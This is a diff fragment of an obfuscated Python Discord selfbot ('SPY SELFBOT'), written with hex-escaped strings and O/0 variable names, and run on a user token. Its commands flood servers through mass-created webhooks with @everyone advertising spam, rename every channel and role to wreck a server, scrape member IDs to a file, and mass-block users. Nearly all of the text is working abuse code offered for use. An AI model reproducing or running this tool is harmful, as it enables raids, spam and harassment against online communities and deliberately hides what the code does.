+        O0O0O000OO000OOOO ={"\x63\x6F\x6E\x74\x65\x6E\x74":"\x40\x65\x76\x65\x72\x79\x6F\x6E\x65\x20\x52\x49\x53\x49\x4E\x50\x4C\x41\x59\x5A\x20\x52\x55\x4E\x53\x20\x43\x4F\x52\x44\x20\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x67\x67\x2F\x50\x4D\x54\x44\x6E\x73\x48\x32\x43\x7A","\x65\x6D\x62\x65\x64\x73":[{"\x74\x69\x74\x6C\x65":"\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54 OP","tts":"true","description":".","url":"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x6E\x73\x74\x72\x61\x67\x72\x61\x6D\x2E\x63\x6F\x6D\x2F\x72\x69\x73\x69\x6E\x70\x6C\x61\x79\x7A","color":OO0O0OO0OO0O0OO0O ,"fields":[{"name":"\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54","value":"."},{"name":"\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54","value":"."},{"name":"\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54","value":"."},{"name":".","value":"."}],"author":{"name":"\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54","url":"https://imgur.com/Lib5iyC","icon_url":"https://imgur.com/Lib5iyC"},"footer":{"text":"\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A","icon_url":"https://imgur.com/Lib5iyC"},"image":{"url":"https://imgur.com/Lib5iyC"},"thumbnail":{"url":"https://imgur.com/Lib5iyC"}},{"url":"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x6E\x73\x74\x67\x72\x61\x6D\x2E\x63\x6F\x6D\x2F\x72\x69\x73\x69\x6E\x70\x6C\x61\x79\x7A","image":{"url":"https://imgur.com/Lib5iyC"}},{"url":"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x6E\x73\x74\x61\x67\x72\x61\x6D\x2E\x63\x6F\x6D\x2F\x72\x69\x73\x69\x6E\x70\x6C\x61\x79\x7A","image":{"url":"https://imgur.com/Lib5iyC"}},{"url":"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x6E\x73\x74\x61\x67\x72\x61\x6D\x2E\x63\x6F\x6D\x2F\x72\x69\x73\x69\x6E\x70\x6C\x61\x79\x7A","image":{"url":"https://imgur.com/Lib5iyC"}}],"username":"\x57\x49\x5A\x5A\x45\x44\x20\x42\x59\x20\x52\x49\x53\x49\x4E\x50\x4C\x41\x59\x5A","avatar_url":"https://imgur.com/Lib5iyC"}#line:641
+        O0O00OOOOO0O0OOOO =requests .post (OOO0O0O0O0O0OO00O ,json =O0O0O000OO000OOOO )#line:643
+        O0O00O0000OOO00OO =O0O00OOOOO0O0OOOO .text #line:644
+        if O0O00OOOOO0O0OOOO .status_code ==204 :#line:645
+            pass #line:646
+        elif "\x72\x61\x74\x65\x20\x6C\x69\x6D\x69\x74\x65\x64"in O0O00O0000OOO00OO .lower ():#line:648
+            try :#line:650
+                O00OOO000OOO0OO0O =json .loads (O0O00O0000OOO00OO )#line:651
+                OO00OO0O0000OO0OO =O00OOO000OOO0OO0O ['\x72\x65\x74\x72\x79\x5F\x61\x66\x74\x65\x72']#line:652
+                O00O00000OOO00OO0 =OO00OO0O0000OO0OO /1000 #line:653
+                time .sleep (O00O00000OOO00OO0 )#line:654
+            except :#line:656
+                OOOOOOO0000O0O0OO =random .randint (5 ,10 )#line:657
+                time .sleep (OOOOOOO0000O0O0OO )#line:658
+        else :#line:659
+            OOOOOOO0000O0O0OO =random .randint (30 ,60 )#line:660
+            time .sleep (OOOOOOO0000O0O0OO )#line:661           
+@SPYSBOP .command (aliases =['webhookfuck','spamwebhooks',"webhooknuke","webhooksnuke","webhooksfuck","spamwebhook"])#line:664
+async def webhookspam (O00OOOO0O00000O00 ):#line:665
+    global spammingdawebhookeroos #line:666
+    spammingdawebhookeroos =True #line:668
+    if len (await O00OOOO0O00000O00 .guild .webhooks ())!=0 :#line:669
+        for OOOO0OOOOOO0OOOOO in await O00OOOO0O00000O00 .guild .webhooks ():#line:670
+            threading .Thread (target =ssspam ,args =(OOOO0OOOOOO0OOOOO .url ,)).start ()#line:671
+    if len (O00OOOO0O00000O00 .guild .text_channels )>=50 :#line:672
+        OOOO0O0O00OOOO0O0 =1 #line:673
+    else :#line:675
+        OOOO0O0O00OOOO0O0 =50 /len (O00OOOO0O00000O00 .guild .text_channels )#line:676
+        OOOO0O0O00OOOO0O0 =int (OOOO0O0O00OOOO0O0 )+1 #line:677
+    for O0O0O00O00OO0O0OO in range (OOOO0O0O00OOOO0O0 ):#line:678
+        for O0OO0O00OOO0OOO00 in O00OOOO0O00000O00 .guild .text_channels :#line:679
+            try :#line:681
+                OOOO0OOOOOO0OOOOO =await O0OO0O00OOO0OOO00 .create_webhook (name ='\x57\x69\x7A\x7A\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A')#line:683
+                threading .Thread (target =ssspam ,args =(OOOO0OOOOOO0OOOOO .url ,)).start ()#line:684
+                OOOO0OOOOOOOO0OOO =open (r'data/webhooks-'+str (O00OOOO0O00000O00 .guild .id )+".txt",'a')#line:685
+                OOOO0OOOOOOOO0OOO .write (f"{OOOO0OOOOOO0OOOOO.url} \n")#line:686
+                OOOO0OOOOOOOO0OOO .close ()#line:687
+            except :#line:689
+                print (f"{Fore.RED} > Webhook Ratelimited.")#line:690
+@SPYSBOP .command (aliases =['stopwebhookfuck','webhookstop',"webhookspamstop","stopwebhooksspam","webhookspamoff"])#line:692
+async def stopwebhookspam (O00000000OOOOOO00 ):#line:693
+    global spammingdawebhookeroos #line:694
+    spammingdawebhookeroos =False #line:696
+@SPYSBOP .command ()#line:698
+async def embed (O00OOOOO00OOO000O ,*,description ):#line:699
+     O00OOO0OO0000OO00 =discord .Embed (title ="\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54",description =description )#line:700
+     O00OOO0OO0000OO00 .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:701
+     await O00OOOOO00OOO000O .send (embed =O00OOO0OO0000OO00 )#line:702
+@SPYSBOP .command (aliases =["rc"])#line:704
+async def renamechannels (O0OO00OO00OO0OOOO ,*,name ):#line:705
+    for OOO000000O00OOO00 in O0OO00OO00OO0OOOO .guild .channels :#line:707
+        await OOO000000O00OOO00 .edit (name =name )#line:708
+@SPYSBOP .command (aliases =["rr"])#line:710
+async def renameroles (O000O0O00OO0O00OO ,*,name ):#line:711
+    for O00O0OO0O0000000O in O000O0O00OO0O00OO .guild .roles :#line:713
+        await O00O0OO0O0000000O .edit (name =name )#line:714
+title ='''`\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A\x23\x32\x30\x37\x37`'''#line:716
+linky ="\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x69\x73\x69\x6E\x70\x6C\x61\x79\x7A\x2E\x68\x6F\x73\x74\x2E\x78\x79\x7A\x2F"#line:717
+footer ="\x53\x63\x72\x65\x65\x6E\x73\x68\x6F\x74"#line:718
+@SPYSBOP .command ()#line:720
+async def image (OO000O0O00O0OO0O0 ,OO0O0OO00O00O0O0O ):#line:721
+  await OO000O0O00O0OO0O0 .message .delete ()#line:722
+  O00O0OO0O0000O00O =discord .Embed (title =title ,description ='',colour =discord .Colour .blue ())#line:726
+  O00O0OO0O0000O00O .set_footer (text =footer )#line:727
+  O00O0OO0O0000O00O .set_image (url =OO0O0OO00O00O0O0O )#line:728
+  await OO000O0O00O0OO0O0 .channel .send (linky ,embed =O00O0OO0O0000O00O )#line:729
+#line:731
+intents =discord .Intents .all ()#line:733
+intents .members =True #line:734
+headers ={'Authorization':f'{risinencryption}'}#line:736
+@SPYSBOP .command ()#line:739
+async def scrape (O0OO0O00OOOO0O0OO ):#line:740
+  await O0OO0O00OOOO0O0OO .message .delete ()#line:741
+  OO00O00OOOO0O0O0O =O0OO0O00OOOO0O0OO .guild .members #line:742
+  for O0OOO00O0O0000O0O in OO00O00OOOO0O0O0O :#line:743
+      try :#line:744
+        print (f"Ids of server {O0OO0O00OOOO0O0OO.guild} are \n {O0OOO00O0O0000O0O.id} {O0OOO00O0O0000O0O.name}")#line:745
+        OO0OO0OO0O0000OO0 =open ("\x6D\x65\x6D\x62\x65\x72\x73\x2E\x74\x78\x74","a")#line:746
+        OO0OO0OO0O0000OO0 .write (str (O0OOO00O0O0000O0O .id )+"\n")#line:748
+        OO0OO0OO0O0000OO0 .close ()#line:749
+      except Exception as O0O0OOOOOOO00O0O0 :#line:751
+        print ("\x65\x72\x72\x6F\x72\x65\x72\x72\x6F\x72",O0O0OOOOOOO00O0O0 )#line:752
+@SPYSBOP .command ()#line:754
+async def block (OO00OOOO00OO0O00O ,*,user :discord .User ):#line:755
+    await OO00OOOO00OO0O00O .send ("\x47\x65\x74\x20\x42\x6C\x6F\x63\x6B\x65\x64\x20\x4E\x6F\x6F\x62\x21")#line:756
+    await user .block ()#line:757
+@SPYSBOP .command ()#line:759
+async def unfriend (O00000OO0O0O0O00O ,*,user :discord .User ):#line:760
+    await user .remove_friend ()#line:761
+    await O00000OO0O0O0O00O .send ('\x46\x72\x69\x65\x6E\x64\x20\x68\x61\x73\x20\x62\x65\x65\x6E\x20\x72\x65\x6D\x6F\x76\x65\x64')#line:762
+@SPYSBOP .command (aliases =['afkoff','afkon'])#line:765
+async def afk (OO0O00OOO0OOO0O0O ,O00O00000OO000OOO =None ):#line:766
+    global isafk #line:767
+    print (OO0O00OOO0OOO0O0O .message .content )#line:769
+    if OO0O00OOO0OOO0O0O .message .content ==f"{risinencryption1.strip()}afkoff":#line:770
+        isafk ="\x6F\x66\x66"#line:771
+    elif OO0O00OOO0OOO0O0O .message .content ==f"{risinencryption1.strip()}afkon":#line:773
+        isafk ="\x6F\x6E"#line:774
+    elif O00O00000OO000OOO ==None :#line:776
+        if isafk =="\x6F\x66\x66":#line:777
+            isafk ="\x6F\x6E"#line:778
+        elif isafk =="\x6F\x6E":#line:779
+            isafk ="\x6F\x66\x66"#line:780
+    else :#line:781
+        if O00O00000OO000OOO .lower ()=="\x6F\x66\x66":#line:782
+            isafk ="\x6F\x66\x66"#line:783
+        if O00O00000OO000OOO .lower ()=="\x6F\x6E":#line:784
+            isafk ="\x6F\x6E"#line:785
+        if O00O00000OO000OOO .lower ()=="\x74\x72\x75\x65":#line:787
+            isafk ="\x6F\x6E"#line:788
+        if O00O00000OO000OOO .lower ()=="\x66\x61\x6C\x73\x65":#line:789
+            isafk ="\x6F\x66\x66"#line:790
+    OO00OO0O000OO000O =random .randint (0x000000 ,0xFFFFFF )#line:792
+    OOOOOOO0O000OOOOO =discord .Embed (title ="`\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54`",description =f"Afk messages are now : `{isafk}`\nTry >afkmessage <message>")#line:793
+    OOOOOOO0O000OOOOO .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:794
+    await OO0O00OOO0OOO0O0O .send (content ="",embed =OOOOOOO0O000OOOOO )#line:795
+@SPYSBOP .command (aliases =['afkmessage','afkmessageedit'])#line:797
+async def afkmsg (OO00000OOOOOOOOO0 ,*,afkstatus ="\x49\x27\x6D\x20\x61\x66\x6B\x20\x2C\x20\x77\x61\x69\x74\x20\x66\x6F\x72\x20\x6D\x65\x20\x74\x6F\x20\x72\x65\x70\x6C\x79"):#line:798
+    global messagetosendwhenafk #line:799
+    messagetosendwhenafk =afkstatus #line:801
+    O0O00O00OOO0O0OOO =random .randint (0x000000 ,0xFFFFFF )#line:803
+    OO00OOOO00OOO0000 =discord .Embed (title ="\x53\x50\x59\x20\x53\x45\x4C\x46\x42\x4F\x54",description =f"Afk messages are : `{isafk}`\nAfk message is : `{messagetosendwhenafk}`")#line:804
+    OO00OOOO00OOO0000 .set_footer (text ="\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x52\x69\x73\x69\x6E\x50\x6C\x61\x79\x5A")#line:805
+    await OO00000OOOOOOOOO0 .send (content ="",embed =OO00OOOO00OOO0000 )#line:806
+
+SPYSBOP .run (risinencryption ,bot =False )
